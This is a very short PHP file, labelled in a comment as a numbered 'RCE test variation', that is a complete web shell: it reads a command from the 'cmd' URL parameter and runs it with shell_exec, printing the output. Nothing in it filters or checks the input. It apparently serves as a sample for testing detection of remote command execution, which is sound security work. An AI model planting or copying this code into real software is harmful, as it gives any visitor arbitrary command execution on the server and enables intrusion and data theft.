<?php
// RCE test variation #1025
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>